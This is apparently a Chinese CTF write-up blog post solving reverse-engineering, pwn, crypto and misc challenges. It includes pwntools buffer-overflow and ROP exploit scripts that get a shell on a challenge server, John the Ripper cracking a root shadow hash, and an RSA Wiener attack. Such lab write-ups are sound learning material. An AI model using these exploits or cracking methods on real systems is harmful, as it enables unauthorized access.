用ida打开，找到相应main函数的地方进行反编译， 输入接收是通过一个函数来实现的，点入查看，发现有一串函数连续调用，然后查看一些字符串，得到，发现： 怀疑上面的函数是经过base64加密而成，然后进行其他运算，最后与e3nifIH9b_C@n@dH进行比较，可得到相应flag，所以我们进行逆向： 12345678910#encoding=utf8import base64 str="e3nifIH9b_C@n@dH"flag="" for i in range(len(str)): flag+=chr(ord(str[i])-i)flag=base64.b64decode(flag).decode("utf-8")print("flag"+flag) Mountain climbing查看文件类型： 用ida打开： 发现只有一个start，怀疑是加过壳，经过PEID扫描发现经过Upx压缩，用对应工具脱壳，之后用ida打开，进入main函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263__int64 main_0()&#123; int v0; // edx __int64 v1; // ST04_8 char v3; // [esp+0h] [ebp-160h] int v4; // [esp+D0h] [ebp-90h] int j; // [esp+DCh] [ebp-84h] int i; // [esp+E8h] [ebp-78h] char Str[104]; // [esp+F4h] [ebp-6Ch] //使用通用随机算法生成种子 srand(0xCu); j_memset(&amp;unk_423D80, 0, 0x9C40u); for ( i = 1; i &lt;= 20; ++i ) &#123; for ( j = 1; j &lt;= i; ++j ) dword_41A138[100 * i + j] = rand() % 100000; &#125; ((void (__cdecl *)(const char *, char))sub_41134D)("input your key with your operation can get the maximum:", v3); sub_411249("%s", (unsigned int)Str); //str的长度只有19 if ( j_strlen(Str) == 19 ) &#123; //经过sub_41114F处理 sub_41114F(Str); v4 = 0; j = 1; i = 1; dword_423D78 += dword_41A138[101]; //遍历19个字符串，当当前字符是L时，dword_423D78如代码变化，如果不是L也不是R则停止，放出报错信息，如果是R则如代码变化，也就是说字符串中只有L和R两种字符。 while ( v4 &lt; 19 ) &#123; //76的ASCII是L if ( Str[v4] == 76 ) &#123; dword_423D78 += dword_41A138[100 * ++i + j]; &#125; else &#123; //82的ASCII是R if ( Str[v4] != 82 ) &#123; ((void (__cdecl *)(const char *, char))sub_41134D)("error\n", v3); system("pause"); goto LABEL_18; &#125; dword_423D78 += dword_41A138[100 * ++i + ++j]; &#125; ++v4; &#125; sub_41134D("your operation can get %d points\n", dword_423D78); system("pause"); &#125; else &#123; ((void (__cdecl *)(const char *, char))sub_41134D)("error\n", v3); system("pause"); &#125;LABEL_18: HIDWORD(v1) = v0; LODWORD(v1) = 0; return v1;&#125; 点入sub_41114F函数，一直点下去，发现一个这样的函数： 12345678910111213141516171819BOOL __cdecl sub_411750(LPCVOID lpAddress, int a2, int a3)&#123; int v3; // ST1C_4 DWORD flOldProtect; // [esp+D4h] [ebp-2Ch] struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+E0h] [ebp-20h] VirtualQuery(lpAddress, &amp;Buffer, 0x1Cu); VirtualProtect(Buffer.BaseAddress, Buffer.RegionSize, 0x40u, &amp;Buffer.Protect); while ( 1 ) &#123; // v3 = a2--; if ( !v3 ) break; *(_BYTE *)lpAddress ^= a3; lpAddress = (char *)lpAddress + 1; &#125; return VirtualProtect(Buffer.BaseAddress, Buffer.RegionSize, Buffer.Protect, &amp;flOldProtect);&#125; Pwnpwn1访问nc 114.116.54.89 10001 打印一下当前目录的文件，会发现： 直接 cat flag即可 flag{6979d853add353c9} PWN2 下载文件，看一下开了什么防护： 没有栈溢出防护，随机化地址也没有。 用ida打开看看： 发现这个文件存在shell，所以大概思路就是利用read函数溢出覆盖到getshell的位置，由于这是调用静态的链接库，所以相对位移是不变的，直接可以得到此时shell的位置 看看read函数中的参数s的数组大小： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152-0000000000000030 s db ?-000000000000002F db ? ; undefined-000000000000002E db ? ; undefined-000000000000002D db ? ; undefined-000000000000002C db ? ; undefined-000000000000002B db ? ; undefined-000000000000002A db ? ; undefined-0000000000000029 db ? ; undefined-0000000000000028 db ? ; undefined-0000000000000027 db ? ; undefined-0000000000000026 db ? ; undefined-0000000000000025 db ? ; undefined-0000000000000024 db ? ; undefined-0000000000000023 db ? ; undefined-0000000000000022 db ? ; undefined-0000000000000021 db ? ; undefined-0000000000000020 db ? ; undefined-000000000000001F db ? ; undefined-000000000000001E db ? ; undefined-000000000000001D db ? ; undefined-000000000000001C db ? ; undefined-000000000000001B db ? ; undefined-000000000000001A db ? ; undefined-0000000000000019 db ? ; undefined-0000000000000018 db ? ; undefined-0000000000000017 db ? ; undefined-0000000000000016 db ? ; undefined-0000000000000015 db ? ; undefined-0000000000000014 db ? ; undefined-0000000000000013 db ? ; undefined-0000000000000012 db ? ; undefined-0000000000000011 db ? ; undefined-0000000000000010 db ? ; undefined-000000000000000F db ? ; undefined-000000000000000E db ? ; undefined-000000000000000D db ? ; undefined-000000000000000C db ? ; undefined-000000000000000B db ? ; undefined-000000000000000A db ? ; undefined-0000000000000009 db ? ; undefined-0000000000000008 db ? ; undefined-0000000000000007 db ? ; undefined-0000000000000006 db ? ; undefined-0000000000000005 db ? ; undefined-0000000000000004 db ? ; undefined-0000000000000003 db ? ; undefined-0000000000000002 db ? ; undefined-0000000000000001 db ? ; undefined+0000000000000000 s db 8 dup(?)+0000000000000008 r db 8 dup(?)+0000000000000010+0000000000000010 ; end of stack variables 也就是说，覆盖0x30+0x8才能进入return,所以直接可以写脚本： 123456from pwn import *p = remote('114.116.54.89','10003')payload = 'a'*0x38+p64(0x400751)p.recvline()p.sendline(payload)p.interactive() flag{n0w_y0u_kn0w_the_Stack0verfl0w} PWN4下载文件，查看一下保护机制： 没有栈溢出防护，可执行，没有地址随机化，有代码可执行段。 在ida64中打开，先看看main函数： 1234567891011__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char s; // [rsp+0h] [rbp-10h] memset(&amp;s, 0, 0x10uLL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); puts("Come on,try to pwn me"); read(0, &amp;s, 0x30uLL); puts("So~sad,you are fail"); return 0LL;&#125; 没有栈溢出防护,而且有read函数，可以进行栈溢出，现在我们需要找到可以执行的shell位置， shift+F12 查看文件中的字符串，看看有没有可疑字符串: 里面发现存在system函数，以及敏感字$0 ，$0在linux中为为shell或shell脚本的名称。system()会调用fork()产生子进程，由子进程来调用/bin/sh -c string来执行参数string字符串所代表的命令，此命令执行完后随即返回原调用的进程。 所以如果将$0作为system的参数，能达到传入&#39;/bin/sh&#39;一样的效果。 接着我们就可以开始传入参数，64位是利用寄存器进行传参，32位使用栈进行传参 这里我们需要找到pop | ret 来进行相应的赋值,利用ROPgadget: 1234567891011121314kali:Desktop # ROPgadget --binary pwn4 --only 'pop|ret'Gadgets information============================================================0x00000000004007cc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007ce : pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007d0 : pop r14 ; pop r15 ; ret0x00000000004007d2 : pop r15 ; ret0x00000000004007cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007cf : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400630 : pop rbp ; ret0x00000000004007d3 : pop rdi ; ret #选用这个0x00000000004007d1 : pop rsi ; pop r15 ; ret0x00000000004007cd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400541 : ret 这里注意一下原因：我们需要找出 pop | ret来进行传值，而上述只有rdi是可以存入数据，rbp和r15是called saved 然后我们还需要找到$0的位置和调用system函数的位置 1234kali:Desktop # ROPgadget --binary pwn4 --string '\$0'Strings information============================================================0x000000000060111f : $0 现在可以开始写脚本： 123456789101112from pwn import *p = remote('114.116.54.89','10004')pop_rdi = 0x00000000004007d3sys_addr = 0x40075Ash_addr = 0x000000000060111fpayload = 'a'*0x18 + p64(pop_rdi)+p64(sh_addr)+p64(sys_addr)p.recvline()p.sendline(payload)p.interactive() 得到flag{264bc50112318cd6e1a67b0724d6d3af} Cryptoeasy_crypto10010 0100 01 110 1111011 11 11111 010 000 0 001101 1010 111 100 0 001101 01111 000 001101 00 10 1 0 010 0 000 1 01111 10 11110 101011 1111101 打开链接，发现这样的一段字符串，可以看出是莫斯电码， ​ 根据上表进行相应的解码程序： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#owner=houhuiting#type=abstractstring=input()key=string.split(" ")dictionary= &#123;'01': 'A', '1000': 'B', '1010': 'C', '100':'D', '0':'E', '0010':'F', '110': 'G', '0000': 'H', '00': 'I', '0111':'J', '101': 'K', '0100': 'L', '11': 'M', '10': 'N', '111': 'O', '0110': 'P', '1101': 'Q', '010': 'R', '000': 'S', '1': 'T', '001': 'U', '0001': 'V', '011': 'W', '1001': 'X', '1011': 'Y', '1100': 'Z', '01111': '1', '00111': '2', '00011': '3', '00001': '4', '00000': '5', '10000': '6', '11000': '7', '11100': '8', '11110': '9', '11111': '0', '001100': '?', '10010': '/', '101101': ')', '100001': '-', '010101': '.', '110011':',', '011010':'@', '111000':':', '101010':':', '10001':'=', '011110':"'", '101011':'!', '001101':'_', '010010':'"', '10110':'(', '1111011':'&#123;', '1111101':'&#125;' &#125;; for item in key:# print(dictionary[item],end='') print(dictionary[item].lower(),end='') 解出flag:FLAG{M0RSE_CODE_1S_INTEREST1N9!} 但是交上去是错的，换成小写试试，flag{m0rse_code_1s_interest1n9!}成功 散乱的密文 lf5{ag024c483549d7fd@@1}一张纸条上凌乱的写着2 1 6 5 3 4 2 1 6 5 3 4 l f 5 { a g 0 2 4 c 4 8 3 5 4 9 d 7 f d @ @ 1 } 按照上述顺序弄出，得到flag{52048c453d794df1} ps: 将后面两个@@去掉 凯撒部长的奖励给出一串字符串： 1MSW&#123;byly_Cm_sIol_lYqUlx_yhdIs_Cn_Wuymul_il_wuff_bcg_pCwnIl_cm_u_Yrwyffyhn_guh_cz_sio_quhn_ni_ayn_bcm_chzilguncihm_sio_wuh_dich_om&#125; 直接凯撒解密: 1SYC&#123;here_Is_yOur_rEwArd_enjOy_It_Caesar_or_call_him_vIctOr_is_a_Excellent_man_if_you_want_to_get_his_informations_you_can_join_us&#125; 一段base64打开解题链接，发现有个flag.txt，说是base64，直接解码(用在线网站解码的话很容易卡死，可能是数据太多) 这里决定用python脚本来完成解密，后面紧跟着一堆加密形式，在脚本中呈现效果 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#coding=utf-8import urllib.parseimport base64import re#第一层base64解密with open('1.txt') as f: cipher1 = f.read().encode('utf-8')plain1 = base64.b64decode(cipher1).decode("utf-8")# print(plain1)# 只有0-7数字 ，怀疑是八进制解码，试试看cipher2 = plain1cipher2 = re.findall(r'\d+',cipher2)# print(cipher2)plain2 = ''for i in cipher2: plain2 += chr(int(i,8))# print(plain2)#现在解出来之后编程了16进制，再次解码cipher3 = plain2cipher3 = re.findall(r'\d+',cipher3)# print(cipher3)plain3 = ''for i in cipher3: plain3 += chr(int(i,16))# print(plain3)#现在得到的编码格式是udd*，推测为unicodecipher4 = plain3cipher4 = re.findall(r'u[\d\w]+',cipher4)cipher4 = ''.join(cipher4).replace(r'u',r'\u')# print(cipher4)# python3没有decode可用，所以这里就这样弄了plain4 = cipher4.encode('utf-8').decode("unicode_escape")# print(plain4)#将得到的数字转成ASCIIcipher5 = re.findall(r'\d+',plain4)plain5 = ''for i in cipher5: plain5+=chr(int(i))# print(plain5)#现在是url16进制cipher6 = re.findall(r'\d+\w?',plain5)plain6 = ''for i in cipher6: plain6 += chr(int(i,16))# print(plain6)#现在是url 10进制，将其转化为ASCII即可cipher7 = re.findall(r'\d+',plain6)plain7 = ''for i in cipher7: plain7 += chr(int(i))plain7 = urllib.parse.unquote(plain7)print(plain7) flag{ctf_tfc201717qwe} .!? 一个ook形式的加密，直接在线解密 +[]- 一段brainfuck加密，还是在线解密 奇怪的密码 看到这种没见过的古典密码，习惯先看看ASCII，看上面的字符串，€符号像{，那么前面四个字母可能就是flag 字母 ASCII 字母 ASCII g 103 f 102 n 110 l 108 d 100 a 97 k 107 g 103 发现，这四个貌似间隔是1，2，3，4 所以想着是不是顺次替换，直接在python上通过chr会产生报错，因为€的编码是8364，chr只能处理256之内的ASCII，所以我们将相应编码通过程序得到： 102 108 97 103 8359 108 101 105 95 99 105 95 106 105 97 109 105 然后通过在线工具进行解密： 得到文本信息：flag₧lei_ci_jiami 尝试flag格式，最后得到flag{lei_ci_jiami} 托马斯.杰斐逊 用一般方法试着解密，发现结果是错误的。 百度一下托马斯·杰斐逊，发现： 现在开始直接利用该方法进行解密： 先将字母表按照密钥顺序排列： 12345678910111213142： &lt;KPBELNACZDTRXMJQOYHGVSFUWI &lt;5： &lt;IHFRLABEUOTSGJVDKCPMNZQWXY &lt;1： &lt;ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;3： &lt;BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;6： &lt;AMKGHIWPNYCJBFZDRUSLOQXVET &lt;4： &lt;RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;9： &lt;QWATDSRFHENYVUBMCOIKZGJXPL &lt;7： &lt;GWTHSPYBXIZULVKMRAFDCEONJQ &lt;8： &lt;NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;14： &lt;XPHKZGJTDSENYVUBMLAOIRFCQW &lt;10： &lt;WABMCXPLTDSRJQZGOIKFHENYVU &lt;13： &lt;BMCSRFHLTDENQWAOXPYVUIKZGJ &lt;11： &lt;XPLTDAOIKFZGHENYSRUBMCQWVJ &lt;12： &lt;TDSWAYXPLVUBOIKZGJRFHENMCQ &lt; 然后根据密文将每行的首字母变为相应密文 1234567891011121314HGVSFUWIKPBELNACZDTRXMJQOYCPMNZQWXYIHFRLABEUOTSGJVDKBVIQHKYPNTCRMOSFEZWAXJGDLUTEQGYXPLOCKBDMAIZVRNSJUWFHSLOQXVETAMKGHIWPNYCJBFZDRUXQYIZMJWAORPLNDVHGFCUKTEBSWATDSRFHENYVUBMCOIKZGJXPLQCEONJQGWTHSPYBXIZULVKMRAFDRJLXKISEFAPMYGHBQNOZUTWDCVQWXPHKZGJTDSENYVUBMLAOIRFCGOIKFHENYVUWABMCXPLTDSRJQZLTDENQWAOXPYVUIKZGJBMCSRFHENYSRUBMCQWVJXPLTDAOIKFZGHSWAYXPLVUBOIKZGJRFHENMCQTD 得到flag{XSXSBUGKUADMIN} 输入发现不对，但题目明确说了是解密的内容，最后发现flag是小写， flag{xsxsbugkuadmin} zip伪加密直接在winhex中修改： 将图中所示改成00即可 解压得到flag{Adm1N-B2G-kU-SZIP} 告诉你个秘密(ISCCCTF)得到下面这样的字符串： 1263 6A 56 35 52 79 42 73 63 44 6C 4A 49 45 4A 71 54 53 42 30 52 6D 68 4356 44 5A 31 61 43 42 35 4E 32 6C 4B 49 46 46 7A 57 69 42 69 61 45 30 67 看起来就像是16进制，使用16进制进行编码，然后将其变为ASCII 1cjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g 开始以为是md5，发现不能解密，尝试常用的加密方式进行解密，发现是base64， 1r5yG lp9I BjM tFhB T6uh y7iJ QsZ bhM 发现r5yg中间包含的是字母T,将所有的解出为tongyuan， 发现不对，试试大写：TONGYUAN，发下flag格式就是大写 这不是md5166 6c 61 67 7b 61 65 37 33 35 38 37 62 61 35 36 62 61 65 66 35 7d 发现跟上题思路类似，解出flag{ae73587ba56baef5} 贝斯家族1@iH&lt;,&#123;bdR2H;i6*Tm,Wx2izpx2! 将知道的base16,32,64都尝试一遍，发现不能解码，尝试base58,91,最后发现是base91编码，解密网站是：http://ctf.ssleye.com/base91.html，但是可能需要收费 还有一种选择是，下载这个解码软件： http://base91.sourceforge.net/ flag{554a5058c9021c76} 富强民主这是一个核心价值观编码 直接在线解密：flag{90025f7fb1959936} python得到两个文件 challenge.py 12345678from N1ES import N1ESimport base64key = #利用函数将key进行加密n1es = N1ES(key)flag = "N1CTF&#123;*****************************************&#125;"cipher = n1es.encrypt(flag)print base64.b64encode(cipher) #HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx N1ES.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879# -*- coding: utf-8 -*-def round_add(a, b): f = lambda x, y: x + y - 2 * (x &amp; y) res = '' for i in range(len(a)): res += chr(f(ord(a[i]), ord(b[i]))) return resdef permutate(table, block): return list(map(lambda x: block[x], table))def string_to_bits(data): #将key中的变为ASCII data = [ord(c) for c in data] #一个字符是一个字节，一个字节是八位 l = len(data) * 8 #将其中的所有位置为0 result = [0] * l pos = 0 for ch in data: for i in range(0,8): #将其中每个bit进行处理 #但是这里的(ch&gt;&gt;i) &amp; 1 --&gt;貌似把&amp;1去掉也没有什么问题 result[(pos&lt;&lt;3)+i] = (ch&gt;&gt;i) &amp; 1 pos += 1 return results_box = [54, 132, 138, 83, 16, 73, 187, 84, 146, 30, 95, 21, 148, 63, 65, 189, 188, 151, 72, 161, 116, 63, 161, 91, 37, 24, 126, 107, 87, 30, 117, 185, 98, 90, 0, 42, 140, 70, 86, 0, 42, 150, 54, 22, 144, 153, 36, 90, 149, 54, 156, 8, 59, 40, 110, 56,1, 84, 103, 22, 65, 17, 190, 41, 99, 151, 119, 124, 68, 17, 166, 125, 95, 65, 105, 133, 49, 19, 138, 29, 110, 7, 81, 134, 70, 87, 180, 78, 175, 108, 26, 121, 74, 29, 68, 162, 142, 177, 143, 86, 129, 101, 117, 41, 57, 34, 177, 103, 61, 135, 191, 74, 69, 147, 90, 49, 135, 124, 106, 19, 89, 38, 21, 41, 17, 155, 83, 38, 159, 179, 19, 157, 68, 105, 151, 166, 171, 122, 179, 114, 52, 183, 89, 107, 113, 65, 161, 141, 18, 121, 95, 4, 95, 101, 81, 156, 17, 190, 38, 84, 9, 171, 180, 59, 45, 15, 34, 89, 75, 164, 190, 140, 6, 41, 188, 77, 165, 105, 5, 107, 31, 183, 107, 141, 66, 63, 10, 9, 125, 50, 2, 153, 156, 162, 186, 76, 158, 153, 117, 9, 77, 156, 11, 145, 12, 169, 52, 57, 161, 7, 158, 110, 191, 43, 82, 186, 49, 102, 166, 31, 41, 5, 189, 27]def generate(o): k = permutate(s_box,o) b = [] for i in range(0, len(k), 7): b.append(k[i:i+7] + [1]) c = [] for i in range(32): pos = 0 x = 0 for j in b[i]: x += (j&lt;&lt;pos) pos += 1 c.append((0x10001**x) % (0x7f)) return cclass N1ES: def __init__(self, key): #判断一下key的长度是否是24 if (len(key) != 24 or isinstance(key, bytes) == False ): raise Exception("key must be 24 bytes long") self.key = key #生成密钥 self.gen_subkey() def gen_subkey(self): #将字符串变为bits o = string_to_bits(self.key) k = [] for i in range(8): o = generate(o) k.extend(o) o = string_to_bits([chr(c) for c in o[0:24]]) self.Kn = [] for i in range(32): self.Kn.append(map(chr, k[i * 8: i * 8 + 8])) return def encrypt(self, plaintext): if (len(plaintext) % 16 != 0 or isinstance(plaintext, bytes) == False): raise Exception("plaintext must be a multiple of 16 in length") res = '' for i in range(len(plaintext) / 16): block = plaintext[i * 16:(i + 1) * 16] L = block[:8] R = block[8:] for round_cnt in range(32): L, R = R, (round_add(L, self.Kn[round_cnt])) L, R = R, L res += L + R return res 这题就当作经验积累吧，这是个Feistel密码，他的加密和解密的算法是相同的，只是需要将密钥取反而已 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879# -*- coding: utf-8 -*-import base64def round_add(a,b): f = lambda x,y: x + y - 2 * (x &amp; y) res = '' for i in range(len(a)): res += chr(f(ord(a[i]),ord(b[i]))) return resdef permutate(table,block): return list(map(lambda x: block[x], table))def string_to_bits(data): data = [ord(c) for c in data] l = len(data)*8 result = [0] * l pos = 0 for ch in data: for i in range(0,8): result[(pos&lt;&lt;3)+i] = (ch&gt;&gt;i) &amp; 1 pos += 1 return results_box = [54, 132, 138, 83, 16, 73, 187, 84, 146, 30, 95, 21, 148, 63, 65, 189, 188, 151, 72, 161, 116, 63, 161, 91, 37, 24, 126, 107, 87, 30, 117, 185, 98, 90, 0, 42, 140, 70, 86, 0, 42, 150, 54, 22, 144, 153, 36, 90, 149, 54, 156, 8, 59, 40, 110, 56,1, 84, 103, 22, 65, 17, 190, 41, 99, 151, 119, 124, 68, 17, 166, 125, 95, 65, 105, 133, 49, 19, 138, 29, 110, 7, 81, 134, 70, 87, 180, 78, 175, 108, 26, 121, 74, 29, 68, 162, 142, 177, 143, 86, 129, 101, 117, 41, 57, 34, 177, 103, 61, 135, 191, 74, 69, 147, 90, 49, 135, 124, 106, 19, 89, 38, 21, 41, 17, 155, 83, 38, 159, 179, 19, 157, 68, 105, 151, 166, 171, 122, 179, 114, 52, 183, 89, 107, 113, 65, 161, 141, 18, 121, 95, 4, 95, 101, 81, 156, 17, 190, 38, 84, 9, 171, 180, 59, 45, 15, 34, 89, 75, 164, 190, 140, 6, 41, 188, 77, 165, 105, 5, 107, 31, 183, 107, 141, 66, 63, 10, 9, 125, 50, 2, 153, 156, 162, 186, 76, 158, 153, 117, 9, 77, 156, 11, 145, 12, 169, 52, 57, 161, 7, 158, 110, 191, 43, 82, 186, 49, 102, 166, 31, 41, 5, 189, 27]def generate(o): k = permutate(s_box,o) b = [] for i in range(0,len(k),7): b.append(k[i:i+7]+[1]) c = [] for i in range(32): pos = 0 x = 0 for j in b[i]: x += (j&lt;&lt;pos) pos += 1 c.append((0x10001**x) % (0x7f)) return cclass N1ES: def __init__(self,key): if (len(key) != 24 or isinstance(key,bytes) == False): raise Exception("key must be 24 bytes long") self.key = key self.gen_subkey() def gen_subkey(self): o = string_to_bits(self.key) k = [] for i in range(8): o = generate(o) k.extend(o) o = string_to_bits([chr(c) for c in o[0:24]]) self.Kn = [] for i in range(32): self.Kn.append(map(chr,k[i*8: i*8+8])) return def decrypt(self,plaintext): res = '' for i in range(len(plaintext)/16): block = plaintext[i*16:(i + 1)*16] L = block[:8] R = block[8:] for round_cnt in range(32): #只需要将此处的取反即可 L,R = R, (round_add(L, self.Kn[31-round_cnt])) L,R = R,L res += L + R return reskey = "wxy191iss00000000000cute"nles = N1ES(key)flag = base64.b64decode("HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx")flag = nles.decrypt(flag)print flag#N1CTF&#123;F3istel_n3tw0rk_c4n_b3_ea5i1y_s0lv3d_/--/&#125; 还有一种方法就是直接都算法，进行暴力破解： 12345678910111213141516import base64,string,N1ESkey = "wxy191iss00000000000cute"c = base64.b64decode("HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx")n1es = N1ES.N1ES(key)f=""for i in xrange(3): for j in xrange(16): for k in string.printable: s="x"*i*16+"x"*j+k+"x"*(48-i*16-j-1) e=n1es.encrypt(s) check=c[i*16+j+8]==e[i*16+j+8] if j&lt;8 else c[i*16+j-8]==e[i*16+j-8] if check: f+=k breakprint f# N1CTF&#123;F3istel_n3tw0rk_c4n_b3_ea5i1y_s0lv3d_/--/&#125; 进制转换1d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e 直接python脚本解密即可 1234567891011121314151617#coding=utf-8data = 'd87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e'enc = data.split(' ')ans =''for i in enc: tag = i[0] if tag == 'x': ans += chr(int(i[1:],16)) elif tag == 'o': ans += chr(int(i[1:],8)) elif tag == 'b': ans += chr(int(i[1:],2)) elif tag == 'd': ans += chr(int(i[1:]))print(ans) 得到Welcome to kelaibei. Give you a flag as a gift. flag{1e4bf81a6394de5abc005ac6e39a387b} . Have a good time~ affine 题目是仿射，所以猜想是flag里面内容需要仿射密码，用脚本解决 1234567891011#coding=utf-8enc = 'szzyfimhyzd'ans = ''for x in enc: x = ord(x) for i in range(0,26): if x == (17*i-8)%26+97: ans += chr(i+97)print(ans) 得到flag: 1flag&#123;affineshift&#125; Crack it下载一个shadow文件，查一下有关信息： Linux操作系统下有一个文件负责所有用户的密码。那就是shadow。该文件的权限必须设置为：-r- — — （400）或者 -rw — —（600）即：Linux /etc/shadow文件是只有系统管理员才有权利进行查看和修改的文件。 使用more命令查看其中一些基本信息： 1root@DESKTOP-OORTB87:/mnt/c/Users/X1TABLET/Desktop# more shadow root:$6$HRMJoyGA$26FIgg6CU0bGUOfqFB0Qo9AE2LRZxG8N3H.3BK8t49wGlYbkFbxVFtGOZqVIq3qQ6k0oetDbn2aVzdhuVQ6US.:17770:0:99999:7::: 这里使用kali中john工具进行密码爆破： 1root@DESKTOP-OORTB87:/mnt/c/Users/X1TABLET/Desktop# john shadow Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 4 OpenMP threads Proceeding with single, rules:Single Press 'q' or Ctrl-C to abort, almost any other key for status Warning: Only 14 candidates buffered for the current salt, minimum 16 needed for performance. Warning: Only 10 candidates buffered for the current salt, minimum 16 needed for performance. Warning: Only 15 candidates buffered for the current salt, minimum 16 needed for performance. Almost done: Processing the remaining buffered candidate passwords, if any. Warning: Only 8 candidates buffered for the current salt, minimum 16 needed for performance. Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist hellokitty (root) //这里有内容 1g 0:00:00:04 DONE 2/3 (2019-10-11 19:50) 0.2427g/s 1337p/s 1337c/s 1337C/s ilovegod..ford Use the "--show" option to display all of the cracked passwords reliably Session completed ps:如果之前已经执行过上面命令，想再次看结果，可以使用john shadow --show 所以flag{hellokitty} RSA12345N : 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597e : 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619enc : 38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192 e比较大，使用维纳攻击获得d,使用rsa-wiener-attack工具求出d, ps:开始本来想着使用yafu求出p,q，但是分解不出来。 下载链接：https://github.com/pablocelayes/rsa-wiener-attack 修改其中的RSAwienerHacker.py: 1234567if __name__ == "__main__": #test_is_perfect_square() #print("-------------------------") n = 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597 e = 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619 d = hack_RSA(e,n) print("d=",d) d = 8264667972294275017293339772371783322168822149471976834221082393409363691895 最后直接用脚本解密即可： 1234567891011#coding:utf-8from libnum import n2s,s2n n =460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597d = 8264667972294275017293339772371783322168822149471976834221082393409363691895c = 38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192m=pow(c,d,n)print(n2s(m)) 得到flag{Wien3r_4tt@ck_1s_3AsY} 来自宇宙的信号 还是积累太少啊。这是标准银河密码 对照得到flag{nopqrst}]]></content>
      <categories>
        <category>CTF</category>
        <category>wp</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>web</tag>
        <tag>crypto</tag>
        <tag>re</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RSA-集锦]]></title>
    <url>%2F2019%2F10%2F21%2FRSA-%E9%9B%86%E9%94%A6%2F</url>
